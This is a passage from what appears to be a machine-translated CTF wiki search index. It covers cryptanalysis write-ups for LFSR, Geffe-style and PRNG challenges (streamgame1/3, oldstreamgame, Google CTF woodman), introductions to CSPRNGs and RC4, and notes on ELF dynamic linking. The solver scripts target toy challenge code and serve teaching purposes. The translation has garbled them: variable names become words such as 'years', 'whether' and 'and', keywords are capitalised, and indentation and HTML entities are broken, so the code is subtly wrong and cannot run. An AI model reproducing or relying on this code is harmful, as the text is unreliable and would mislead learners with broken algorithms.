\u5f3a\u7f51\u676fstreamgame1","text":"<p>Simply look at the topic</p> <pre><code>from flag import flag\n\nassert flag.startswith(\"flag{\")\n\nassert flag.endswith(\"}\")\n\nassert len(flag)==25\n\n\n\ndef lfsr(R,mask):\n\n    output = (R &lt;&lt; 1) &amp; 0xffffff\n\n    i=(R&amp;mask)&amp;0xffffff\n\n    lastbit=0\n\n    while i!=0:\n\n        lastbit^=(i&amp;1)\n\n        i=i&gt;&gt;1\n\n    output^=lastbit\n\n    return (output,lastbit)\n\n\n\n\n\n\n\nR=int(flag[5:-1],2)\n\nmask    =   0b1010011000100011100\n\n\n\nf=open(\"key\",\"ab\")\n\nfor i in range(12):\n\n    tmp=0\n\n    for j in range(8):\n\n        (R,out)=lfsr(R,mask)\n\n        tmp=(tmp &lt;&lt; 1)^out\n\n    f.write(chr(tmp))\n\nf.close()\n</code></pre> <p>It can be found that the length of the flag is 25-5-1=19, so it can be violently enumerated. result</p> <pre><code>\u279c 2018-Strong Net Cup-streamgame1 git:(master) \u2717 python exp.py\n12\n\n0b1110101100001101011\n</code></pre> <p>Therefore flag is flag{1110101100001101011}.</p>"},{"location":"crypto/streamcipher/fsr/lfsr/#2018-ciscn-preliminary-match-oldstreamgame","title":"2018 CISCN preliminary match oldstreamgame","text":"<p>Simply look at the topic</p> <pre><code>flag = \"flag{xxxxxxxxxxxxxxxx}\"\n\nassert flag.startswith(\"flag{\")\n\nassert flag.endswith(\"}\")\n\nassert len(flag)==14\n\n\n\ndef lfsr(R,mask):\n\n    output = (R &lt;&lt; 1) &amp; 0xffffffff\n\n    i=(R&amp;mask)&amp;0xffffffff\n\n    lastbit=0\n\n    while i!=0:\n\n        lastbit^=(i&amp;1)\n\n        i=i&gt;&gt;1\n\n    output^=lastbit\n\n    return (output,lastbit)\n\n\n\nR=int(flag[5:-1],16)\n\nmask = 0b10100100000010000000100010010100\n\n\n\nf=open(\"key\",\"w\")\n\nfor i in range(100):\n\n    tmp=0\n\n    for j in range(8):\n\n        (R,out)=lfsr(R,mask)\n\n        tmp=(tmp &lt;&lt; 1)^out\n\n    f.write(chr(tmp))\n\nf.close()\n</code></pre> <p>The program is very simple, it is still an LFSR, but the initial state is 32 bits. Of course, we can also choose to blast, but here we do not choose blasting.</p> <p>Here are two approaches.</p> <p>In the first method, the 32th bit of the program output is determined by the first 31 bits of the program output and the first bit of the initial seed, so we can know the first bit of the initial seed, and then we can know the initial seed. The second bit, and so on. code show as below</p> <pre><code>mask = 0b10100100000010000000100010010100\n\nb = ''\n\nN = 32\n\nwith open('key', 'rb') as f:\n\n    b = f.read()\n\nkey = ''\n\nfor i in range(N / 8):\n\n    t = ord(b[i])\n\n    for j in xrange(7, -1, -1):\n\n        key += str(t &gt;&gt; j &amp; 1)\n\nidx = 0\n\nans = &amp;quot;&amp;quot;\nkey = key[31] + key[:32]\n\nwhile idx &lt; 32:\n\n    tmp = 0\n\n    for i in range(32):\n\n        if mask &gt;&gt; i &amp; 1:\n\n            tmp ^= int(key[31 - i])\n\nans = str (tmp) + years\n    idx += 1\n\n    key = key[31] + str(tmp) + key[1:31]\n\nSurely = int (ans, 2)\nPrint Hex (whether)\n</code></pre> <p>run</p> <pre><code>\u279c  2018-CISCN-start-oldstreamgame git:(master) \u2717 python exp1.py\n\n0x926201d7\n</code></pre> <p>In the second approach, we can consider the process of matrix conversion. If 32 linear transformations are performed, the first 32 bits of the output stream can be obtained. In fact, we only need the first 32 bits to restore the initial state.</p> <pre><code>mask = 0b10100100000010000000100010010100\n\n\n\nN = 32\n\nF = GF(2)\n\n\n\nb = ''\n\nwith open('key', 'rb') as f:\n\n    b = f.read()\n\n\n\nR = [vector(F, N) for i in range(N)]\n\nfor i in range(N):\n\n    R[i][N - 1] = mask &gt;&gt; (31 - i) &amp; 1\n\nfor i in range(N - 1):\n\n    R[i + 1][i] = 1\n\nM = Matrix(F, R)\n\nM = M ^ N\n\n\n\nvec = vector(F, N)\n\nrow = 0\n\nfor i in range(N / 8):\n\n    t = ord(b[i])\n\n    for j in xrange(7, -1, -1):\n\n        vec[row] = t &gt;&gt; j &amp; 1\n\n        row += 1\n\nprint rank(M)\n\nnum = int(''.join(map(str, list(M.solve_left(vec)))), 2)\n\nPrint Hex (whether)\n</code></pre> <p>Running script</p> <pre><code>\u279c  2018-CISCN-start-oldstreamgame git:(master) \u2717 sage exp.sage\n\n32\n\n0x926201d7\n</code></pre> <p>Thus flag is flag{926201d7}.</p> <p>Another way is for TokyoWesterns, you can refer to the corresponding folder file.</p>"},{"location":"crypto/streamcipher/fsr/lfsr/#topic","title":"topic","text":""},{"location":"crypto/streamcipher/fsr/lfsr/#references","title":"references","text":"<ul> <li>Cryptography handouts, edited by Li Chao, Qu Longjiang</li> </ul>"},{"location":"crypto/streamcipher/fsr/nfsr/","title":"\u975e\u53cd\u9988 feedback shift register","text":""},{"location":"crypto/streamcipher/fsr/nfsr/#introduction","title":"Introduction","text":"<p>In order to make the sequence of key stream output as complex as possible, a nonlinear feedback shift register is used. There are three common types.</p> <ul> <li>Nonlinear combination generator that uses a nonlinear combination function for the output of multiple LFSRs</li> <li>Nonlinear filter generator that uses a nonlinear combination function for the contents of an LFSR</li> <li>Clock generator that uses the output of one (or more) LFSRs to control the clock of another (or multiple) LFSRs</li> </ul>"},{"location":"crypto/streamcipher/fsr/nfsr/#nonlinear-combination-generator","title":"Nonlinear Combination Generator","text":""},{"location":"crypto/streamcipher/fsr/nfsr/#introduction_1","title":"Introduction","text":"<p>The combination generator is generally shown below.</p> <p></p>"},{"location":"crypto/streamcipher/fsr/nfsr/#geffe","title":"Geffe","text":"<p>Here we take Geffe as an example. Geffe contains 3 linear feedback shift registers, and the nonlinear combination function is</p> <p>F(x_1,x_2,x_3)=(x_1 \\and x_2) \\oplus (\\urcorner x_1 \\and x_3)=(x_1 \\and x_2) \\oplus ( x_1 \\and x_3)\\oplus x_3</p>"},{"location":"crypto/streamcipher/fsr/nfsr/#2018-strong-net-cup-streamgame3","title":"2018 Strong Net Cup streamgame3","text":"<p>Simply look at the topic</p> <pre><code>from flag import flag\n\nassert flag.startswith(\"flag{\")\n\nassert flag.endswith(\"}\")\n\nassert len(flag)==24\n\n\n\ndef lfsr(R,mask):\n\n    output = (R &lt;&lt; 1) &amp; 0xffffff\n\n    i=(R&amp;mask)&amp;0xffffff\n\n    lastbit=0\n\n    while i!=0:\n\n        lastbit^=(i&amp;1)\n\n        i=i&gt;&gt;1\n\n    output^=lastbit\n\n    return (output,lastbit)\n\n\n\n\n\ndef single_round(R1,R1_mask,R2,R2_mask,R3,R3_mask):\n\n    (R1_NEW,x1)=lfsr(R1,R1_mask)\n\n    (R2_NEW,x2)=lfsr(R2,R2_mask)\n\n    (R3_NEW,x3)=lfsr(R3,R3_mask)\n\n    return (R1_NEW,R2_NEW,R3_NEW,(x1*x2)^((x2^1)*x3))\n\n\n\nR1=int(flag[5:11],16)\n\nR2=int(flag[11:17],16)\n\nR3=int(flag[17:23],16)\n\nassert len (bin (R1) [2:]) == 17\nassert len (bin (R2) [2:]) == 19\nassert len(bin(R3)[2:])==21\n\nR1_mask=0x10020\n\nR2_mask=0x4100c\n\nR3_mask=0x100002\n\n\n\n\n\nfor fi in range(1024):\n\nprint fi\ntmp1mb = &amp;quot;&amp;quot;\n    for i in range(1024):\n\ntmp1kb = &amp;quot;&amp;quot;\n        for j in range(1024):\n\n            tmp=0\n\n            for k in range(8):\n\n                (R1,R2,R3,out)=single_round(R1,R1_mask,R2,R2_mask,R3,R3_mask)\n\n                tmp = (tmp &lt;&lt; 1) ^ out\n\n            tmp1kb+=chr(tmp)\n\ntmp1mb + = tmp1kb\n    f = open(\"./output/\" + str(fi), \"ab\")\n\n    f.write(tmp1mb)\n\n    f.close()\n</code></pre> <p>It can be seen that the program is very similar to the Geffe generator. Here we use the related attack method to attack. We can count the output of the last class Geffe generator when the three LFSR outputs are different, as follows.</p> <p>| x_1 | x_2 | x_3 | F(x_1,x_2,x_3) |</p> <p>| ----- | ----- | ----- | ---------------- |</p> <p>| 0     | 0     | 0     | 0                |</p> <p>| 0     | 0     | 1     | 1                |</p> <p>| 0     | 1     | 0     | 0                |</p> <p>| 0     | 1     | 1     | 0                |</p> <p>| 1     | 0     | 0     | 0                |</p> <p>| 1     | 0     | 1     | 1                |</p> <p>| 1     | 1     | 0     | 1                |</p> <p>| 1     | 1     | 1     | 1                |</p> <p>it can be discovered</p> <ul> <li>Geffe's output has the same probability as x_1 0.75</li> <li>Geffe's output has the same probability of x_2 as 0.5</li> <li>Geffe's output has the same probability of x_3 as 0.75</li> </ul> <p>This shows that the output is very relevant to the first and third. Therefore, we can violently enumerate the output of the first and third LFSRs to determine the number equal to the output of Geffe-like, and if it is about 75%, it can be considered correct. The second is a direct violent enumeration.</p> <p>The script is as follows</p> <pre><code>#for x1 in range(2):\n\n#    for x2 in range(2):\n\n#        for x3 in range(2):\n\n#            print x1,x2,x3,(x1*x2)^((x2^1)*x3)\n\n#n = [17,19,21]\n\n\n\n#cycle = 1\n\n#for i in n:\n\n#    cycle = cycle*(pow(2,i)-1)\n\n#print cycle\n\n\n\n\n\ndef lfsr(R, mask):\n\n    output = (R &lt;&lt; 1) &amp; 0xffffff\n\n    i = (R &amp; mask) &amp; 0xffffff\n\n    lastbit = 0\n\n    while i != 0:\n\n        lastbit ^= (i &amp; 1)\n\n        i = i &gt;&gt; 1\n\n    output ^= lastbit\n\n    return (output, lastbit)\n\n\n\n\n\ndef single_round(R1, R1_mask, R2, R2_mask, R3, R3_mask):\n    (R1_NEW, x1) = lfsr(R1, R1_mask)\n\n    (R2_NEW, x2) = lfsr(R2, R2_mask)\n\n    (R3_NEW, x3) = lfsr(R3, R3_mask)\n\n    return (R1_NEW, R2_NEW, R3_NEW, (x1 * x2) ^ ((x2 ^ 1) * x3))\n\n\n\n\n\nR1_mask = 0x10020\n\nR2_mask = 0x4100c\n\nR3_mask = 0x100002\n\nn3 = 21\nn2 = 19\nn1 = 17\n\n\n\n\ndef guess(beg, end, num, mask):\n\n    ansn = range(beg, end)\n\n    data = open('./output/0').read(num)\n\n    data = ''.join(bin(256 + ord(c))[3:] for c in data)\n\n    now = 0\n\ntrue = 0\n    for i in ansn:\n\n        r = i\n\n        cnt = 0\n\n        for j in range(num * 8):\n\n            r, lastbit = lfsr(r, mask)\n\n            lastbit = str(lastbit)\n\n            cnt += (lastbit == data[j])\n\n        if cnt &gt; now:\n\n            now = cnt\n\n            res = i\n\n            print now, res\n\n    return res\n\n\n\n\n\ndef bruteforce2(x, z):\n\n    data = open('./output/0').read(50)\n\n    data = ''.join(bin(256 + ord(c))[3:] for c in data)\n\n    for y in range(pow(2, n2 - 1), pow(2, n2)):\n\n        R1, R2, R3 = x, y, z\n\n        flag = True\n\n        for i in range(len(data)):\n\n(R1, R2, R3,\n             out) = single_round(R1, R1_mask, R2, R2_mask, R3, R3_mask)\n\n            if str(out) != data[i]:\n\n                flag = False\n\n                break\n\n        if y % 10000 == 0:\n\n            print 'now: ', x, y, z\n\n        if flag:\n\n            print 'ans: ', hex(x)[2:], hex(y)[2:], hex(z)[2:]\n\n            break\n\n\n\n\n\nR1 = guess(pow(2, n1 - 1), pow(2, n1), 40, R1_mask)\n\nprint R1\n\nR3 = guess(pow(2, n3 - 1), pow(2, n3), 40, R3_mask)\n\nprint R3\n\nR1 = 113099\nR3 = 1487603\n\n\nbruteforce2(R1, R3)\n</code></pre> <p>The results are as follows</p> <pre><code>\u279c  2018-CISCN-start-streamgame3 git:(master) \u2717 python exp.py\n\n161 65536\n\n172 65538\n\n189 65545\n\n203 65661\n\n210 109191\n\n242 113099\n\n113099\n\n157 1048576\n\n165 1048578\n\n183 1048580\n\n184 1049136\n\n186 1049436\n\n187 1049964\n\n189 1050869\n\n190 1051389\n\n192 1051836\n\n194 1053573\n\n195 1055799\n\n203 1060961\n\n205 1195773\n\n212 1226461\n\n213 1317459\n\n219 1481465\n\n239 1487603\n\n1487603\n\nnow:  113099 270000 1487603\n\nnow:  113099 280000 1487603\n\nnow:  113099 290000 1487603\n\nnow:  113099 300000 1487603\n\nnow:  113099 310000 1487603\n\nnow:  113099 320000 1487603\n\nnow:  113099 330000 1487603\n\nnow:  113099 340000 1487603\n\nnow:  113099 350000 1487603\n\nnow:  113099 360000 1487603\n\nyears old: 1b9cb 5979c 16b2f3\n</code></pre> <p>Thus flag is flag{01b9cb05979c16b2f3}.</p>"},{"location":"crypto/streamcipher/fsr/nfsr/#topic","title":"topic","text":"<ul> <li> <p>2017 WHCTF Bornpig</p> </li> <li> <p>2018 Google CTF 2018 Betterzip</p> </li> </ul>"},{"location":"crypto/streamcipher/fsr/nfsr/#reference","title":"Reference","text":"<ul> <li> <p>https://www.rocq.inria.fr/secret/Anne.Canteaut/MPRI/chapter3.pdf</p> </li> <li> <p>http://data.at.preempted.net/INDEX/articles/Correlation_Attacks_Geffe.pdf</p> </li> </ul>"},{"location":"crypto/streamcipher/lcg/challenge/","title":"\u9898","text":""},{"location":"crypto/streamcipher/lcg/challenge/#2016-google-ctf-woodman","title":"2016 Google CTF woodman","text":"<p>The approximate meaning of the program is a guessing game. If you guess a number of times in a row, even if you get the flag, the core code behind the corresponding number is as follows:</p> <pre><code>class SecurePrng(object):\n\n    def __init__(self):\n\n        # generate seed with 64 bits of entropy\n\n        self.p = 4646704883L\n\n        self.x = random.randint(0, self.p)\n\n        self.y = random.randint(0, self.p)\n\n\n\n    def next(self):\n\n        self.x = (2 * self.x + 3) % self.p\n\n        self.y = (3 * self.y + 9) % self.p\n\n        return (self.x ^ self.y)\n</code></pre> <p>Here we obviously, we guessed that the first two rounds are still relatively easy, after all, the probability is also 0.25. Here, after we guessed the first two rounds, we used Z3 to solve the initial x and y, then we can easily guess the remaining values.</p> <p>The specific script is as follows, but Z3 seems to be problematic when solving such problems. . .</p> <p>Here we consider another method, ** sequentially extracting the value of x from the low-bit enumeration to the high-bit bit. The reason for this is that it depends on such observation.</p> <ul> <li>a + b = c, the value of the ith bit of c is only affected by the a and b bits and lower bits. **Because the i-th bit is operated, only the carry value of the low bit may be received. **</li> <li>a - b = c, the value of the ith bit of c is only affected by the a and b bits and lower bits. **Because the i-th bit is operated, there is only a possible borrow from the low bit. **</li> <li>a * b = c, the value of the ith bit of c is only affected by the a and b bits and lower bits. Because this can be seen as multiple additions.</li> <li>a % b = c, the value of the ith bit of c is only affected by the a and b bits and lower bits. Because this can be seen as multiple subtractions.</li> <li>a ^ b = c, the value of the ith bit of c is only affected by the bits a and b. This is obvious.</li> </ul> <p>**Note: Personally feel this technique is very useful. **</p> <p>In addition, it is not difficult to know that the bit of p is 33 bits. The specific use ideas are as follows</p> <ol> <li>First get the value you guessed twice, this probability is 0.25.</li> <li>In turn, enumerate the corresponding bits of x after the first iteration from the low bit to the high bit.</li> <li>Calculate the second value according to the value of the enumeration. Only when the corresponding bit is correct, you can add it to the candidate correct value. It should be noted that due to the modulo, we need to reduce the number of enumerations in the end.</li> <li>In addition, in the final judgment, it is still necessary to ensure that the corresponding value meets certain requirements, because the number of reductions has been enumerated before.</li> </ol> <p>The specific use code is as follows</p> <pre><code>import\nimport random\n\nfrom itertools import product\n\n\n\n\n\nclass SecurePrng(object):\n\n    def __init__(self, x=-1, y=-1):\n\n        # generate seed with 64 bits of entropy\n\n        self.p = 4646704883L  # 33bit\n\n        if x == -1:\n\n            self.x = random.randint(0, self.p)\n\n        else:\n\n            self.x = x\n\n        if y == -1:\n\n            self.y = random.randint(0, self.p)\n\n        else:\n\nself.y = and\n\n\n    def next(self):\n\n        self.x = (2 * self.x + 3) % self.p\n\n        self.y = (3 * self.y + 9) % self.p\n\n        return (self.x ^ self.y)\n\n\n\n\n\ndef getbiti(num, idx):\n\n    return bin(num)[-idx - 1:]\n\n\n\n\n\ndef main():\n\n    sp = SecurePrng()\n\n    targetx = sp.x\n\n    targety = sp.y\n\n    print \"we would like to get x \", targetx\n\n    print \"we would like to get y \", targety\n\n\n\n    # suppose we have already guess two number\n\nguess1 = sp.next ()\n    guess2 = sp.next()\n\n\n\n    p = 4646704883\n\n\n\n    # newx = tmpx*2+3-kx*p\n\n    for kx, ky in product(range(3), range(4)):\n\n        candidate = [[0]]\n\n        # only 33 bit\n\n        for i in range(33):\n\n            #print 'idx ', i\n\n            new_candidate = []\n\n            for old, bit in product(candidate, range(2)):\n\n                #print old, bit\n\n                oldx = old[0]\n\n                #oldy = old[1]\n\n                tmpx = oldx | ((bit &amp; 1) &lt;&lt; i)\n\n                #tmpy = oldy | ((bit / 2) &lt;&lt; i)\n\n                tmpy = tmpx ^ guess1\n\n                newx = tmpx * 2 + 3 - kx * p + (1 &lt;&lt; 40)\n\nnewy = tmpy * 3 + 9 - ky * p + (1 &amp;lt;&amp;lt; 40)\ntmp1 = newx ^ newy\n                #print \"tmpx:    \", bin(tmpx)\n\n                #print \"targetx: \", bin(targetx)\n\n                #print \"calculate:     \", bin(tmp1 + (1 &lt;&lt; 40))\n\n                #print \"target guess2: \", bin(guess1 + (1 &lt;&lt; 40))\n\n                if getbiti(guess2 + (1 &lt;&lt; 40), i) == getbiti(\n\ntmp1 + (1 &amp;lt;&amp;lt; 40), i):\n                    if [tmpx] not in new_candidate:\n\n                        #print \"got one\"\n\n                        #print bin(tmpx)\n\n                        #print bin(targetx)\n\n                        #print bin(tmpy)\n\n                        new_candidate.append([tmpx])\n\n            candidate = new_candidate\n\n#print len (candidate)\n            #print candidate\n\n        print \"candidate x for kx: \", kx, \" ky \", ky\n\n        for item in candidate:\n\n            tmpx = candidate[0][0]\n\n            tmpy = tmpx ^ guess1\n\n            if tmpx &gt;= p or tmpx &gt;= p:\n\n                continue\n\n            mysp = SecurePrng(tmpx, tmpy)\n\n            tmp1 = mysp.next()\n\n            if tmp1 != guess2:\n\n                continue\n            print tmpx, tmpy\n\n            print(targetx * 2 + 3) % p, (targety * 3 + 9) % p\n\n\n\n\n\nif __name__ == \"__main__\":\n\n    main()\n</code></pre>"},{"location":"crypto/streamcipher/lcg/intro/","title":"Linear Congruence Generator","text":"<p>To be added.</p>"},{"location":"crypto/streamcipher/prng/csprng/","title":"\u5bc6\u7801\u5b89\u5168 pseudo-random number generator","text":""},{"location":"crypto/streamcipher/prng/csprng/#introduction","title":"Introduction","text":"<p>The cryptographically secure pseudo-random number generator (CSPRNG), also known as the cryptographic pseudo-random number generator (CPRNG), is a special pseudo-random number generation. Device. It needs to meet some of the necessary features to be suitable for cryptographic applications.</p> <p>Many aspects of cryptography require random numbers</p> <ul> <li>Key generation</li> <li>Generate initialization vector, IV, CBC, CFB, OFB mode for grouping passwords</li> <li>nounce, used to prevent replay attacks and CTR mode of block ciphers, etc.</li> <li> <p>one-time pads</p> </li> <li> <p>Salt in some signature schemes, such as [ECDSA] (https://en.wikipedia.org/wiki/ECDSA), [RSASSA-PSS] (https://en.wikipedia.org/w/index.php ?title=RSASSA-PSS&amp;action=edit&amp;redlink=1)</p> </li> </ul>"},{"location":"crypto/streamcipher/prng/csprng/#demand","title":"demand","text":"<p>There is no doubt that the requirements for cryptographically secure pseudo-random number generators are certainly higher than for general pseudo-random number generators. In general, CSPRNG requirements can be divided into two categories.</p> <ul> <li>Pass the statistical randomness test. CSPRNG must pass [next-bit test] (https://en.wikipedia.org/wiki/Next-bit_test), that is, knowing the first k bits of a sequence, it is impossible for an attacker to A probability greater than 50% predicts the next bit. One point mentioned here is that Yao Zhizhi proved in 1982 that if a generator can pass [next-bit test] (https://en.wikipedia.org/wiki/Next-bit_test), then it can also pass all other Polynomial time statistics test.</li> <li>Must be able to resist strong enough attacks, such as when the initial state of the generator or the state of the runtime is known to the attacker, the attacker is still unable to obtain the generated random number before the leak state.</li> </ul>"},{"location":"crypto/streamcipher/prng/csprng/#categories","title":"Categories","text":"<p>As far as the current situation is concerned, the design of CSPRNG can be divided into the following three categories.</p> <ul> <li>Based on cryptographic algorithms such as ciphertext or hash values.</li> <li>Based on math problems</li> <li>Some special purpose designs</li> </ul>"},{"location":"crypto/streamcipher/prng/csprng/#references","title":"references","text":"<ul> <li>https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator</li> </ul>"},{"location":"crypto/streamcipher/prng/intro/","title":"pseudo random number generator introduction","text":""},{"location":"crypto/streamcipher/prng/intro/#overview","title":"Overview","text":"<p>A pseudorandom number generator (PRNG), also known as a deterministic random bit generator (DRBG), is an algorithm used to generate a digital sequence** close to an absolute random number sequence. . In general, a PRNG relies on an initial value, also called a seed, to generate a corresponding pseudo-random number sequence. As long as the seed is determined, the random number generated by the PRNG is completely determined, so the sequence of random numbers it generates is not truly random.</p> <p>For now, PRNG plays an important role in many applications, such as simulation (Monte Carlo method), e-sports, and password applications.</p>"},{"location":"crypto/streamcipher/prng/intro/#randomness-of-rigor","title":"Randomness of rigor","text":"<ul> <li>Randomness: Random numbers should be free of statistical bias and are completely messy series.</li> <li>Unpredictability: The next occurrence cannot be inferred from the past sequence.</li> <li>Non-reproducibility: The same sequence cannot be reproduced unless the sequence is saved.</li> </ul> <p>The stringency of these three properties increases in turn.</p> <p>In general, random numbers can be divided into three categories.</p> Category Randomness Unpredictability Non-reproducibility <p>| Weak pseudo-random number | \u2705 | \u274c | \u274c | | Strong pseudo-random number | \u2705 | \u2705 | \u274c | | Real random number | \u2705 | \u2705 | \u2705 |</p> <p>In general, the random number used in cryptography is the second.</p>"},{"location":"crypto/streamcipher/prng/intro/#cycle","title":"Cycle","text":"<p>As we said before, once the seed that the PRNG depends on is determined, the sequence of random numbers generated by the PRNG is basically determined. The period in which the PRNG is defined here is as follows: For all possible starting states of a PRNG**, the longest length of the sequence is not repeated. Obviously, for a PRNG, its period will not be greater than all its possible states. However, it should be noted that not when we encounter repeated output, we can consider it to be the period of the PRNG, because the state of the PRNG is generally greater than the number of bits of the output.</p>"},{"location":"crypto/streamcipher/prng/intro/#evaluation-standard","title":"evaluation standard","text":"<p>See Wikipedia, https://en.wikipedia.org/wiki/Pseudorandom_number_generator.</p>"},{"location":"crypto/streamcipher/prng/intro/#categories","title":"Categories","text":"<p>Currently, the common pseudo-random number generator mainly has</p> <ul> <li>Linear Congruence Generator, LCG</li> <li>Linear regression generator</li> <li>[Mersenne Twister] (https://en.wikipedia.org/wiki/Mersenne_Twister)</li> <li> <p>xorshift generators</p> </li> <li> <p>WELL family of generators</p> </li> <li> <p>Linear feedback shift register, LFSR, linear feedback shift register</p> </li> </ul>"},{"location":"crypto/streamcipher/prng/intro/#problem","title":"problem","text":"<p>In general, pseudo-random number generators may have the following problems</p> <ul> <li>In the case of some seeds, the period of the generated random number sequence will be smaller.</li> <li>Uneven distribution when generating large numbers.</li> <li>The continuous values are closely related, and the subsequent values are known, and the previous values can be known.</li> <li>The value of the output sequence is very uneven.</li> </ul>"},{"location":"crypto/streamcipher/prng/intro/#reference","title":"Reference","text":"<p>https://en.wikipedia.org/wiki/Pseudorandom_number_generator</p>"},{"location":"crypto/streamcipher/prng/problem/","title":"\u9898","text":""},{"location":"crypto/streamcipher/prng/problem/#2017-tokyo-westerns-ctf-3rd-backpackers-problem","title":"2017 Tokyo Westerns CTF 3<sup>rd</sup> Backpacker's Problem","text":"<p>A cpp file is given in the title, which probably means the following</p> <pre><code>Given the integers a_1, a_2, ..., a_N, your task is to find a subsequence b of a\n\nwhere b_1 + b_2 + ... + b_K = 0.\n\n\n\nInput Format: N a_1 a_2 ... a_N\n\nAnswer Format: K b_1 b_2 ... b_K\n\n\n\nExample Input:\n\n4 -8 -2 3 5\n\nExample Answer:\n\n3 -8 3 5\n</code></pre> <p>It is a backpack problem. Among them, in this question, we need to solve 20 such backpack problems, the size of the backpack is 1 * 10 ~ 20 * 10 in order. The backpack problem of subset summation is an NPC problem, and the time complexity of the problem increases exponentially with the size of the backpack. The size of the backpack here is at most 200, and it is obviously impossible to use brute force.</p> <p>To be completed</p>"},{"location":"crypto/streamcipher/prng/problem/#references","title":"references","text":"<ul> <li> <p>https://github.com/r00ta/myWriteUps/tree/master/GoogleCTF/woodman</p> </li> <li> <p>http://mslc.ctf.su/wp/google-ctf-woodman-crypto-100/</p> </li> </ul>"},{"location":"crypto/streamcipher/special/rc4/","title":"RC4","text":""},{"location":"crypto/streamcipher/special/rc4/#basic-introduction","title":"basic introduction","text":"<p>Designed by Ron Rivest, RSA was originally part of RSA Security and is a patented cryptographic product. It is a byte-oriented stream cipher with a variable key length that is very simple, but it works. The RC4 algorithm is widely used in the SSL/TLS protocol and the WEP/WPA protocol.</p>"},{"location":"crypto/streamcipher/special/rc4/#basic-process","title":"Basic Process","text":"<p>RC4 mainly consists of three processes</p> <ul> <li>Initialize the S and T arrays.</li> <li>Initialize the replacement S.</li> <li>Generate a key stream.</li> </ul>"},{"location":"crypto/streamcipher/special/rc4/#initializing-s-and-t-arrays","title":"Initializing S and T arrays","text":"<p>The code to initialize S and T is as follows</p> <pre><code>for i = 0 to 255 do\n\n    S[i] = i\n\n    T[i] = K[i mod keylen])\n</code></pre> <p></p>"},{"location":"crypto/streamcipher/special/rc4/#initialization-replacement-s","title":"Initialization replacement S","text":"<pre><code>j = 0\n\nfor i = 0 to 255 do \n\n    j = (j + S[i] + T[i]) (mod 256) \n\n    swap (S[i], S[j])\n</code></pre>"},{"location":"crypto/streamcipher/special/rc4/#generating-a-stream-key","title":"Generating a stream key","text":"<pre><code>i = j = 0 \n\nfor each message byte b\n\ni = (i + 1) (toward 256)\n    j = (j + S[i]) (mod 256)\n\n    swap(S[i], S[j])\n\n    t = (S[i] + S[j]) (mod 256) \n\n    print S[t]\n</code></pre> <p>We generally refer to the first two parts as KSA and the last part to PRGA.</p>"},{"location":"crypto/streamcipher/special/rc4/#attack-method","title":"Attack method","text":"<p>To be added.</p>"},{"location":"executable/elf/program-linking/","title":"\u7a0b\u5e8f\u94fe\u63a5","text":""},{"location":"executable/elf/program-linking/#static-link","title":"Static link","text":""},{"location":"executable/elf/program-linking/#dynamic-link","title":"Dynamic link","text":"<p>Dynamic linking is mainly to resolve variables or references to functions during program initialization or during program execution. Some sections and head elements in an ELF file are related to dynamic links. Dynamically linked models are defined and implemented by the operating system.</p>"},{"location":"executable/elf/program-linking/#dynamic-linker","title":"Dynamic Linker","text":"<p>The dynamic linker can be used to help load the libraries needed by the application and parse the dynamic symbols (functions and global variables) exported by the library.</p> <p>When using dynamic linking to construct a program, the link-editor adds an element of type PT_INTERP to the program's program header to tell the system to call the dynamic linker as a program interpreter.</p> <p>&gt; It should be noted that different systems will be different for the dynamic linker provided by the system.</p> <p>The executable and the dynamic linker work together to create a process image for the program, as detailed below:</p> <ol> <li>Add the memory segment of the executable to the process image.</li> <li>Add the memory segment of the shared object file to the process image.</li> <li>Relocate the executable and shared object files.</li> <li>If passed to the dynamic linker a file descriptor, close it.</li> <li>Pass control to the program. This makes us feel as if the program got the execute permission directly from the executable.</li> </ol> <p>The link editor also creates a variety of data to assist the dynamic linker in handling executables and shared object files, such as</p> <ul> <li>Sections of type SHT_DYNAMIC contain a variety of data, including information about other dynamic links at the beginning of this section.</li> <li>The section .hash of type SHT_HASH contains a symbol hash table.</li> <li>Sections .got and .plt of type SHT_PROGBITS contain two separate tables: global offset table, procedure linked table. The program uses the procedure link table to process the address independent code.</li> </ul> <p>Because all UNIX System V imports basic system services from a shared object file, the dynamic linker participates in the execution of each TIS ELF-conforming program.</p> <p>As stated in the program loading, the shared object file may occupy a different virtual address than that recorded in the program header. The dynamic linker relocates the memory image and updates the absolute address before the program takes control. If the shared object file is indeed loaded into the address specified in the program header, then the values of those absolute addresses will be correct. But usually, this will not happen.</p> <p>If the process's environment has a non-null value called LD_BIND_NOW, then the dynamic linker performs all relocations when passing permissions to the program. For example, all values of the following environment variables specify this behavior.</p> <ul> <li> <p>LD_BIND_NOW = 1</p> </li> <li> <p>LD_BIND_NOW = on</p> </li> <li> <p>LD_BIND_NOW = off</p> </li> </ul> <p>Otherwise, LD_BIND_NOW either does not exist in the current process environment or has a non-null value. The dynamic linker can delay the entry of the link table of the parsing process. This is actually the delay binding of the plt table, that is, when the program needs to use a certain symbol, then address resolution, which can reduce the load of symbol resolution and relocation.</p>"},{"location":"executable/elf/program-linking/#function-address","title":"Function Address","text":"<p>The address reference of a function in the executable and the reference associated with it in the shared target may not be resolved to a value. The corresponding reference in the shared object file will be parsed by the dynamic linker to the virtual address corresponding to the function itself. The corresponding reference in the executable (from the shared object file) will be resolved by the link editor to the address in the entry for the corresponding function in the procedure link table.</p> <p>In order to allow different function addresses to work as expected, if an executable file references a function defined in the shared object file, the link editor will put the process link table entry of the corresponding function into the symbol associated with it. In the table entry. The dynamic linker handles this symbol table item in a special way. If the dynamic linker is looking for a symbol and encounters a symbol in the executable file for a symbol table entry, it will follow the following rules:</p> <ol> <li>If the <code>st_shndx</code> of the symbol table entry is not <code>SHN_UNDEF</code>, the dynamic linker will find the definition of this symbol and use its st_value as the address of the symbol.</li> <li>If <code>st_shndx</code> is <code>SHN_UNDEF</code> and the symbol type is <code>STT_FUNC</code> and the <code>st_value</code> member is not 0, the dynamic linker will treat this entry as special and use the value of <code>st_value</code> as the symbol the address of.</li> <li>Otherwise, the dynamic linker will assume that the symbols in the executable are undefined and continue processing.</li> </ol> <p>Some relocations are related to the entries of the process linkage table. These entries are used for direct function calls, not for reference function addresses. These relocations are not handled as above because the dynamic linker must not be able to redirect process link table entries and point them to themselves.</p>"},{"location":"executable/elf/program-linking/#shared-object-dependencies","title":"Shared Object Dependencies","text":"<p>When the link editor is processing an archive library, it extracts the library members and copies them into the output object file. This statically linked operation does not require dynamic connector participation during execution. The shared object file also provides the service, and the dynamic linker must attach the appropriate shared object file to the process image for easy execution. Therefore, executable files and shared object files specifically describe their 